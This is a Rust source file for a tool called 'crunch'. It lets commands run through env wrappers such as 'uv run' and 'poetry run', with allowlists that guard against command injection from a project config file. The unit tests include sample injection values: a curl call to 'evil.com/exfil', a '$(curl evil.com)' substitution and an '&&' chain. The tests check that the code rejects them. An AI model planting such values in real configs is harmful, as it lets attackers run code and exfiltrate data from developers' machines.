use lazy_static::lazy_static;
use regex::Regex;

/// Allowed env-wrapper commands. Only these exact strings are accepted as wrappers
/// to prevent command injection via malicious .crunch.toml files.
const ALLOWED_WRAPPERS: &[&str] = &[
    "uv run",
    "poetry run",
    "pipx run",
    "pdm run",
    "conda run",
    "nix run",
    "mise run",
];

fn is_allowed_wrapper(wrapper: &str) -> bool {
    ALLOWED_WRAPPERS.contains(&wrapper)
}

/// Tools that are reasonable to env-wrap. Broad enough for Python/Node/Ruby ecosystems
/// while blocking sensitive system tools (git, ssh, curl, etc.) from being wrapped via
/// a malicious `.crunch.toml`. Defense-in-depth alongside the project-level `[env]` block.
const ALLOWED_WRAP_TARGETS: &[&str] = &[
    // Python
    "python", "python3", "pip", "pip3", "pytest", "mypy", "ruff", "black", "isort", "flake8",
    "pylint", "pyright", "ipython", "jupyter", // Node
    "node", "npm", "npx", "pnpm", "yarn", // Ruby
    "ruby", "gem", "bundle", "rake", "rails", "rspec", // General
    "make", "cargo", "uv",
];

lazy_static! {
    // Env-wrapper commands: `uv run`, `poetry run`, `pipx run`, `pdm run`
    // These activate a virtualenv before running the inner tool, so the wrapper must
    // be preserved and `crunch` inserted between wrapper and tool.
    //
    // Note: `uv run` appears in two contexts in crunch:
    // 1. As an env wrapper here (e.g., `uv run pytest` → insert crunch between)
    // 2. As a rewrite prefix in rules.rs for `uv pip`/`uv sync` (handled by classify.rs)
    // The regex only matches `uv run` followed by a space, so `uv pip list`
    // and `uv sync` correctly fall through to the rules-based rewrite system.
    pub(super) static ref ENV_WRAPPER: Regex =
        Regex::new(r"^(uv\s+run|poetry\s+run|pipx\s+run|pdm\s+run)\s+").unwrap();
}

/// Apply env-wrapper using the global cached config.
pub(super) fn maybe_env_wrap(
    base: &str,
    cmd_part: &str,
    redirect_suffix: &str,
    inner_result: Option<String>,
) -> Option<String> {
    let env = &crate::config::cached_config().env;
    maybe_env_wrap_with_config(base, cmd_part, redirect_suffix, inner_result, env)
}

/// Apply env-wrapper logic given an explicit `EnvConfig`.
///
/// Rules:
/// - If no wrapper is configured, return `inner_result` unchanged.
/// - If `wrap_commands` is empty, feature is inactive — return `inner_result` unchanged.
/// - If `base` is not in `wrap_commands`, return `inner_result` unchanged.
/// - If `cmd_part` already starts with `wrapper`, do not double-wrap.
/// - If `base` has a mise task mapping, mise handles the env — return `inner_result` unchanged.
/// - Otherwise, prepend `wrapper` to the inner result (if Some) or to `cmd_part` + `redirect_suffix`.
pub(super) fn maybe_env_wrap_with_config(
    base: &str,
    cmd_part: &str,
    redirect_suffix: &str,
    inner_result: Option<String>,
    env: &crate::config::EnvConfig,
) -> Option<String> {
    // No wrapper configured → pass through
    let wrapper = match env.wrapper.as_deref() {
        Some(w) if !w.is_empty() => w,
        _ => return inner_result,
    };

    // Security: only allow known safe wrapper commands
    if !is_allowed_wrapper(wrapper) {
        eprintln!(
            "[crunch] warning: ignoring unknown env wrapper '{}' — only {:?} are allowed",
            wrapper, ALLOWED_WRAPPERS
        );
        return inner_result;
    }

    // Feature inactive when no commands listed
    if env.wrap_commands.is_empty() {
        return inner_result;
    }

    // Only wrap commands explicitly listed
    if !env.wrap_commands.iter().any(|c| c == base) {
        return inner_result;
    }

    // Security (S3): defense-in-depth allowlist — even if a project-level .crunch.toml
    // lists a dangerous tool in wrap_commands, only known-safe targets are accepted.
    if !ALLOWED_WRAP_TARGETS.contains(&base) {
        return inner_result;
    }

    // Do not double-wrap. Use a word-boundary check so that a wrapper like
    // "uv run" does not false-match a command beginning with "uv runner-script".
    if cmd_part == wrapper || cmd_part.starts_with(&format!("{} ", wrapper)) {
        return inner_result;
    }

    // If mise already handles this tool, let mise do it
    if crate::mise_cmd::lookup_mise_task(base).is_some() {
        return inner_result;
    }

    // Wrap: prepend wrapper to the already-rewritten command (or to the raw cmd_part)
    Some(match inner_result {
        Some(rewritten) => format!("{} {}", wrapper, rewritten),
        None => {
            if redirect_suffix.is_empty() {
                format!("{} {}", wrapper, cmd_part)
            } else {
                format!("{} {}{}", wrapper, cmd_part, redirect_suffix)
            }
        }
    })
}

#[cfg(test)]
mod tests {
    use super::super::rewrite::rewrite_segment_with_env;

    fn uv_env() -> crate::config::EnvConfig {
        crate::config::EnvConfig {
            wrapper: Some("uv run".to_string()),
            wrap_commands: vec!["python3".to_string(), "pytest".to_string()],
        }
    }

    fn poetry_env() -> crate::config::EnvConfig {
        crate::config::EnvConfig {
            wrapper: Some("poetry run".to_string()),
            wrap_commands: vec!["python3".to_string(), "pytest".to_string()],
        }
    }

    fn no_wrapper_env() -> crate::config::EnvConfig {
        crate::config::EnvConfig {
            wrapper: None,
            wrap_commands: vec!["python3".to_string()],
        }
    }

    fn empty_wrap_commands_env() -> crate::config::EnvConfig {
        crate::config::EnvConfig {
            wrapper: Some("uv run".to_string()),
            wrap_commands: vec![],
        }
    }

    /// Case 1: python3 (unsupported by crunch) with wrapper → prepend wrapper directly
    #[test]
    fn test_env_wrap_python3_bare_command() {
        let result = rewrite_segment_with_env("python3 script.py", &[], &uv_env());
        assert_eq!(result, Some("uv run python3 script.py".to_string()));
    }

    /// Case 2: pytest (crunch-supported) with wrapper and no mise mapping → wrapper + crunch rewrite
    #[test]
    fn test_env_wrap_pytest_supported_no_mise() {
        let result = rewrite_segment_with_env("pytest -x", &[], &uv_env());
        assert_eq!(result, Some("uv run crunch pytest -x".to_string()));
    }

    /// Case 3: git (not in wrap_commands) → unchanged behavior (crunch git status)
    #[test]
    fn test_env_wrap_git_not_in_wrap_commands() {
        let result = rewrite_segment_with_env("git status", &[], &uv_env());
        assert_eq!(result, Some("crunch git status".to_string()));
    }

    /// Case 4: No wrapper configured → all behavior unchanged
    #[test]
    fn test_env_wrap_no_wrapper_configured() {
        let result = rewrite_segment_with_env("python3 script.py", &[], &no_wrapper_env());
        // python3 is not crunch-supported, no wrapper → None
        assert_eq!(result, None);
    }

    /// Case 5: Empty wrap_commands → feature inactive (no wrapping happens)
    #[test]
    fn test_env_wrap_empty_wrap_commands_inactive() {
        let result = rewrite_segment_with_env("pytest -x", &[], &empty_wrap_commands_env());
        // wrap_commands is empty → feature inactive → normal crunch rewrite
        assert_eq!(result, Some("crunch pytest -x".to_string()));
    }

    /// Case 6a: Compound with python3 and pytest, both in wrap_commands
    #[test]
    fn test_env_wrap_compound_python3_and_pytest() {
        // python3 setup.py → uv run python3 setup.py
        let r1 = rewrite_segment_with_env("python3 setup.py", &[], &uv_env());
        assert_eq!(r1, Some("uv run python3 setup.py".to_string()));

        // pytest -x → uv run crunch pytest -x
        let r2 = rewrite_segment_with_env("pytest -x", &[], &uv_env());
        assert_eq!(r2, Some("uv run crunch pytest -x".to_string()));
    }

    /// Case 7: Trailing redirect preserved — wrapper only applies to cmd_part
    #[test]
    fn test_env_wrap_redirect_preserved() {
        let result = rewrite_segment_with_env("python3 script.py 2>&1", &[], &uv_env());
        assert_eq!(result, Some("uv run python3 script.py 2>&1".to_string()));
    }

    /// Case 8: Already wrapped — do NOT double-wrap
    #[test]
    fn test_env_wrap_no_double_wrap() {
        let result = rewrite_segment_with_env("uv run python3 script.py", &[], &uv_env());
        // Already starts with "uv run" — must not add another "uv run"
        assert!(
            result
                .as_deref()
                .map(|s: &str| !s.starts_with("uv run uv run"))
                .unwrap_or(true),
            "Should not double-wrap: {:?}",
            result
        );
    }

    /// Case 9: poetry run wrapper variant works
    #[test]
    fn test_env_wrap_poetry_run_variant() {
        let result = rewrite_segment_with_env("pytest -v", &[], &poetry_env());
        assert_eq!(result, Some("poetry run crunch pytest -v".to_string()));
    }

    /// Pipe segment: python3 before pipe gets wrapped, pipe remainder stays raw
    #[test]
    fn test_env_wrap_pipe_first_segment_only() {
        // rewrite_command uses rewrite_segment per-segment; for a pipe, only first segment
        // is rewritten. We test the segment directly here.
        let result = rewrite_segment_with_env("python3 script.py", &[], &uv_env());
        assert_eq!(result, Some("uv run python3 script.py".to_string()));
    }

    // ---- Security: allowlist validation tests ----

    fn malicious_env(wrapper: &str) -> crate::config::EnvConfig {
        crate::config::EnvConfig {
            wrapper: Some(wrapper.to_string()),
            wrap_commands: vec!["python3".to_string()],
        }
    }

    /// Security S1a: curl injection wrapper must be rejected — inner_result returned unchanged
    #[test]
    fn test_env_wrap_rejects_malicious_wrapper() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("curl https://evil.com/exfil ;");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result, inner,
            "Malicious curl wrapper must be rejected; inner_result returned unchanged"
        );
    }

    /// Security S1b: command substitution wrapper must be rejected
    #[test]
    fn test_env_wrap_rejects_command_substitution() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("$(curl evil.com)");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result, inner,
            "Command substitution wrapper must be rejected"
        );
    }

    /// Security S1c: semicolon injection wrapper must be rejected
    #[test]
    fn test_env_wrap_rejects_semicolon_injection() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("malicious &&");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result, inner,
            "Semicolon/&& injection wrapper must be rejected"
        );
    }

    /// Security S1d: "uv run" must still be allowed after allowlist is added
    #[test]
    fn test_env_wrap_allows_uv_run() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("uv run");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result,
            Some("uv run crunch python3 script.py".to_string()),
            "uv run must be accepted as an allowed wrapper"
        );
    }

    /// Security S1e: "poetry run" must still be allowed after allowlist is added
    #[test]
    fn test_env_wrap_allows_poetry_run() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("poetry run");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result,
            Some("poetry run crunch python3 script.py".to_string()),
            "poetry run must be accepted as an allowed wrapper"
        );
    }

    /// Security S1f: "conda run" must still be allowed after allowlist is added
    #[test]
    fn test_env_wrap_allows_conda_run() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("conda run");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        assert_eq!(
            result,
            Some("conda run crunch python3 script.py".to_string()),
            "conda run must be accepted as an allowed wrapper"
        );
    }

    /// Security S1g: "mise run" must still be allowed after allowlist is added
    #[test]
    fn test_env_wrap_allows_mise_run() {
        use super::maybe_env_wrap_with_config;
        let env = malicious_env("mise run");
        let inner = Some("crunch python3 script.py".to_string());
        let result =
            maybe_env_wrap_with_config("python3", "python3 script.py", "", inner.clone(), &env);
        // mise run delegates to the mise task; lookup_mise_task for "python3" returns None in
        // tests, so the wrapper should be applied.
        assert_eq!(
            result,
            Some("mise run crunch python3 script.py".to_string()),
            "mise run must be accepted as an allowed wrapper"
        );
    }

    // --- R2: double-wrap check uses word boundary ---

    #[test]
    fn test_env_wrap_no_false_positive_on_similar_prefix() {
        use super::maybe_env_wrap_with_config;
        // "uv runner" should NOT be treated as already wrapped with "uv run"
        let env = crate::config::EnvConfig {
            wrapper: Some("uv run".into()),
            wrap_commands: vec!["uv".into()],
        };
        let result = maybe_env_wrap_with_config("uv", "uv runner-script", "", None, &env);
        assert_eq!(result, Some("uv run uv runner-script".to_string()));
    }

    // --- S3: wrap_commands restricted to known tools ---

    #[test]
    fn test_env_wrap_rejects_dangerous_wrap_target() {
        use super::maybe_env_wrap_with_config;
        let env = crate::config::EnvConfig {
            wrapper: Some("uv run".into()),
            wrap_commands: vec!["ssh".into()],
        };
        let result = maybe_env_wrap_with_config("ssh", "ssh server", "", None, &env);
        assert_eq!(result, None); // ssh not in allowed targets
    }

    #[test]
    fn test_env_wrap_allows_python_wrap_target() {
        use super::maybe_env_wrap_with_config;
        let env = crate::config::EnvConfig {
            wrapper: Some("uv run".into()),
            wrap_commands: vec!["python3".into()],
        };
        let result = maybe_env_wrap_with_config("python3", "python3 script.py", "", None, &env);
        assert_eq!(result, Some("uv run python3 script.py".to_string()));
    }
}
